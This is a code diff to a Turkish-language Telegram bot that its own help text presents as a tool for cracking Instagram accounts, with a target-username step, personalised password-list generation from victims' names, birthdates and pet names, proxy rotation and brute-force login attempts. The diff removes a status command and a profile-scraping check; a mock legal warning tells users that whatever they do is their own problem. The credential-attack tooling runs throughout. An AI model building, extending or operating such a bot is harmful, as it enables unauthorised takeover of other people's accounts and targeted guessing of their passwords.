@@ -526,22 +526,6 @@ class TelegramBot:
         else:
             await update.message.reply_text("❌ Durdurulacak aktif saldırı bulunamadı.")
 
-    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Saldırı durumunu kontrol et"""
-        user_id = update.effective_user.id
-        if user_id in self.brute_force_tasks and not self.brute_force_tasks[user_id].done():
-            try:
-                # Durum bilgisi için user_data'dan bilgi al
-                username = self.user_data[user_id]['username']
-                total_passwords = len(open(self.user_data[user_id]['password_file'], 'r', encoding='utf-8').readlines())
-                await update.message.reply_text(
-                    f"ℹ️ Saldırı devam ediyor.\nHedef: {username}\nToplam şifre: {total_passwords}\nTimeout: {self.user_data[user_id]['timeout']} saniye"
-                )
-            except Exception as e:
-                await update.message.reply_text(f"❌ Durum kontrolü hatası: {str(e)}")
-        else:
-            await update.message.reply_text("❌ Aktif saldırı yok.")
-
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         self._initialize_user_data(user_id)
@@ -571,7 +555,6 @@ class TelegramBot:
                     [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                     [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                     [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
-                    [InlineKeyboardButton("📊 Durum Kontrol", callback_data='check_status')],
                     [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                     [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
                 ]
@@ -822,7 +805,6 @@ class TelegramBot:
             [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
             [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
             [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
-            [InlineKeyboardButton("📊 Durum Kontrol", callback_data='check_status')],
             [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
             [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
         ]
@@ -920,8 +902,6 @@ class TelegramBot:
             await self.generate_password_file(query, user_id)
         elif query.data == 'start_attack':
             await self.start_attack(update, context)
-        elif query.data == 'check_status':
-            await self.status(update, context)
         elif query.data == 'skip_lastname':
             self.user_data[user_id]['password_profile']['lastname'] = ''
             keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
@@ -975,7 +955,7 @@ class TelegramBot:
                 "👾 V.VV SUNAR HACKER V3.0 ile Instagram hesaplarını kırmak çok kolay! 🔥\n"
                 "⚠️ *Yasal Uyarı*: Bu botu sadece kendi hesabın veya izinli testler için kullan! hahah şska be ne yapıyorsan yap senin sorunun! 😎\n\n"
                 "*Adım Adım Kullanım:*\n"
-                "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz. Kullanıcı adı kontrol edilip takipçi, takip edilen ve bio bilgileri alınacak.\n"
+                "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz.\n"
                 "2. *Şifre Listesi Yükle veya Oluştur* 📜🔑:\n"
                 "   - *Yükle*: Hazır bir .txt dosyasında şifre listeni yükle (her satır bir şifre, max 512 karakter).\n"
                 "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap. Maksimum şifre sayısını belirtebilirsin (100-50000). Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
@@ -984,8 +964,7 @@ class TelegramBot:
                 "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force'u başlat. Şüpheli şifreler otomatik tekrar denenir ve işlem bitince detaylı rapor .txt olarak indirilecek:\n"
                 "   - Denenen şifre sayısı\n"
                 "   - Şüpheli şifrelerin tekrar denenme durumu\n"
-                "   - Her denemenin sonucu, kullanılan proxy ve süresi\n"
-                "6. *Durum Kontrol* 📊: Saldırı devam ederken /status komutu veya buton ile durumu kontrol et.\n\n"
+                "   - Her denemenin sonucu, kullanılan proxy ve süresi\n\n"
                 "*💡 İpuçları*:\n"
                 "- Boş bırakmak için her adımda *Boş Bırak* butonunu kullan.\n"
                 "- Şifre listesi oluştururken çok fazla kelime ekleme, yoksa liste devasa olur! 😅\n"
@@ -999,7 +978,6 @@ class TelegramBot:
                 [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                 [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                 [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
-                [InlineKeyboardButton("📊 Durum Kontrol", callback_data='check_status')],
                 [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1034,7 +1012,6 @@ class TelegramBot:
             [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
             [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
             [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
-            [InlineKeyboardButton("📊 Durum Kontrol", callback_data='check_status')],
             [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
             [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
         ]
@@ -1067,36 +1044,6 @@ class TelegramBot:
         
         if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
             await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
-            return
-
-        # Kullanıcı profili doğrulama ve bilgi çekme
-        username = self.user_data[user_id]['username']
-        try:
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}
-            response = requests.get(f"https://www.instagram.com/{username}/", headers=headers, timeout=5)
-            if response.status_code != 200:
-                await query.message.reply_text(f"❌ Kullanıcı adı ({username}) Instagram'da bulunamadı!")
-                return
-            
-            # Takipçi, takip edilen ve bio bilgilerini çekme
-            page_content = response.text
-            follower_match = re.search(r'"edge_followed_by":\{"count":(\d+)\}', page_content)
-            following_match = re.search(r'"edge_follow":\{"count":(\d+)\}', page_content)
-            bio_match = re.search(r'"biography":"(.*?)"', page_content, re.DOTALL)
-            
-            followers = follower_match.group(1) if follower_match else "Bilinmiyor"
-            following = following_match.group(1) if following_match else "Bilinmiyor"
-            bio = bio_match.group(1).replace('\n', ' ') if bio_match else "Yok"
-            
-            await query.message.reply_text(
-                f"✅ Kullanıcı bulundu!\n"
-                f"Kullanıcı Adı: {username}\n"
-                f"Takipçi: {followers}\n"
-                f"Takip Edilen: {following}\n"
-                f"Bio: {bio[:100]}{'...' if len(bio) > 100 else ''}"
-            )
-        except Exception as e:
-            await query.message.reply_text(f"❌ Kullanıcı adı kontrolü başarısız: {str(e)}")
             return
 
         try:
@@ -1185,7 +1132,6 @@ async def main():
     
     application.add_handler(CommandHandler("start", bot.start))
     application.add_handler(CommandHandler("stop", bot.stop_attack))
-    application.add_handler(CommandHandler("status", bot.status))
     application.add_handler(CallbackQueryHandler(bot.button))
     application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, bot.handle_message))
     
